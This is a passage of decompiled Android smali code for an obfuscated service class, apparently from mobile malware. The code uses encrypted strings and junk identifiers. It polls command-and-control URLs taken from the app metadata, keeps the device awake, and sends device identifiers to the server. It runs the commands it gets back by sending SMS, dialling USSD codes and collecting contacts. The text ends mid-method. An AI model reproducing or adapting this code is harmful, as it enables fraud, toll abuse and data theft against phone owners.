.class public Lcompse/refact/st/upsssss/CommandService;
.super Landroid/app/IntentService;


# static fields
.field private static eryryhrtytujrtujrurt:Ljava/util/concurrent/atomic/AtomicBoolean;


# instance fields
.field fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

.field hukuiluliulu:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

.field sdfsdfsdfsdf:Landroid/content/Context;

.field public sdvsdvsvsevsvsev:Ljava/lang/String;

.field serfwefewfwefewef:Ljava/lang/String;

.field public zxcvxvsdvsvsvs:Ljava/lang/Integer;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    new-instance v0, Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;-><init>(Z)V

    sput-object v0, Lcompse/refact/st/upsssss/CommandService;->eryryhrtytujrtujrurt:Ljava/util/concurrent/atomic/AtomicBoolean;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    const-string v0, "B/A7B3"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->hukuiluliulu:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v0, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    return-void
.end method

.method public static serfwefewfwefewef()Z
    .locals 1

    sget-object v0, Lcompse/refact/st/upsssss/CommandService;->eryryhrtytujrtujrurt:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v0

    return v0
.end method


# virtual methods
.method public fsafsdfsfsdfsfsdfsd()V
    .locals 6

    :try_start_0
    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    iget-object v1, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x80

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    iget-object v2, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    if-eqz v2, :cond_1

    const-string v0, "|3C:J$"

    const-string v1, "](d$"

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, p0, Lcompse/refact/st/upsssss/CommandService;->zxcvxvsdvsvsvs:Ljava/lang/Integer;

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->serfwefewfwefewef:Ljava/lang/String;

    new-instance v3, Ljava/util/ArrayList;

    const/4 v0, 0x5

    invoke-direct {v3, v0}, Ljava/util/ArrayList;-><init>(I)V

    const/4 v0, 0x1

    move v1, v0

    :goto_0
    const/4 v4, 0x6

    if-ge v0, v4, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v4, 0x0

    const-string v5, "M.d(h/"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v4, v5}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    add-int/lit8 v0, v1, 0x1

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    move v1, v0

    goto :goto_0

    :cond_0
    invoke-virtual {v3}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_1
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1

    const/16 v3, 0xc8

    if-ne v1, v3, :cond_2

    iput-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    const-class v3, Lcompse/refact/st/upsssss/Comm;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    :cond_1
    :goto_2
    return-void

    :cond_2
    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    iget-object v3, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    const-class v4, Lcompse/refact/st/upsssss/Comm;

    invoke-direct {v1, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    goto :goto_1

    :catch_0
    move-exception v0

    goto :goto_2

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/net/MalformedURLException;->printStackTrace()V

    goto :goto_2

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method

.method public fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)V
    .locals 7

    const/4 v6, 0x0

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->hukuiluliulu:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v1, v6, v2}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ":@1\u0001&G&"

    invoke-static {v2}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "y|"

    invoke-static {v3}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v6, v3}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-virtual {v5, p0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v6, v5}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "*%\u0006G9A3\u000f\u0018Z;M3]l\u0002{\u0002v"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "a\u0003\u0008G\u0003F\u0019$l$a"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "*"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->sdfsdfsdfsdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    return-void
.end method

.method public onCreate()V
    .locals 0

    invoke-super {p0}, Landroid/app/IntentService;->onCreate()V

    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 1

    iput-object p0, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    :try_start_0
    invoke-virtual {p0}, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    invoke-super {p0, p1, p2, p3}, Landroid/app/IntentService;->onStartCommand(Landroid/content/Intent;II)I

    :try_start_0
    const-string v0, "/|,"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "%B%"

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v0, :cond_0

    if-eqz v1, :cond_0

    invoke-virtual {p0, v0, v1}, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    const/4 v0, 0x1

    return v0

    :catch_0
    move-exception v0

    const-string v0, ""

    invoke-static {v0, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method public sdfsdfsdfsdf()V
    .locals 13

    const/4 v2, 0x0

    const/high16 v12, 0x10000000

    const/4 v11, 0x1

    :goto_0
    const-string v0, "1f6l3"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    const-string v1, ""

    invoke-virtual {v0, v11, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v3

    invoke-virtual {v3}, Landroid/os/PowerManager$WakeLock;->acquire()V

    sget-object v0, Lcompse/refact/st/upsssss/CommandService;->eryryhrtytujrtujrurt:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0, v11}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd()V

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->sdfsdfsdfsdf:Landroid/content/Context;

    const-string v0, "D3V1Z7]2"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v0

    const-string v1, "q"

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    if-ne v0, v11, :cond_1c

    const-string v0, "f"

    invoke-static {v0}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    move-object v1, v0

    move-object v0, p0

    :goto_1
    invoke-virtual {v0}, Lcompse/refact/st/upsssss/CommandService;->zxcvxvsdvsvsvs()Ljava/lang/String;

    move-result-object v0

    iget-object v4, p0, Lcompse/refact/st/upsssss/CommandService;->hukuiluliulu:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v5, v2, v6}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "H7[3\u0001&G&"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "y|"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v2, v7}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    iget-object v7, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v9, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-virtual {v9, p0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v2, v9}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "l"

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    iget-object v9, p0, Lcompse/refact/st/upsssss/CommandService;->serfwefewfwefewef:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "{"

    invoke-static {v9}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v8, "l"

    invoke-static {v8}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v7, v0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->sdfsdfsdfsdf(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v5, v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-virtual {v1, v0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "u\u000fF="

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-ne v1, v11, :cond_1d

    iget-object v1, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-virtual {v1, v0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :cond_0
    :goto_2
    const-string v1, "3{"

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    move v0, v2

    move v1, v2

    :goto_3
    array-length v5, v4

    if-ge v0, v5, :cond_1e

    aget-object v0, v4, v1

    const-string v5, "|3A2p\u0005b\u0005"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_1

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "u/|,k${|"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "S\"J.[k"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    aget-object v5, v4, v1

    const-string v6, "5l9}|"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    new-instance v6, Landroid/content/Intent;

    const-class v7, Lcompse/refact/st/upsssss/SendSMS;

    invoke-direct {v6, p0, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v7, "%[$"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    aget-object v5, v5, v11

    invoke-virtual {v6, v7, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v6, "/|,"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v5, "\u0003}\u001a"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/CommandService;->sdvsdvsvsevsvsev:Ljava/lang/String;

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_1
    aget-object v0, v4, v1

    const-string v5, "\u0012l/m\u001e\\\u0012Z\u0005"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_2

    iget-object v0, p0, Lcompse/refact/st/upsssss/CommandService;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    aget-object v5, v4, v1

    const-string v6, "*|\"N$[ J4p5N:Ck"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "u2\u007f$k%z5"

    invoke-static {v7}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v5, v6, v7}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v5, Landroid/content/Intent;

    const-class v6, Lcompse/refact/st/upsssss/USSD;

    invoke-direct {v5, p0, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v6, "%[$"

    invoke-static {v6}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v12}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/CommandService;->startActivity(Landroid/content/Intent;)V

    :cond_2
    aget-object v0, v4, v1

    const-string v5, "\u0006f\u001eJ.g5h\"}2"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/zxcvxvsdvsvsvs;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-ne v0, v11, :cond_3

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/Contacts;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "\u0003}\u001a"

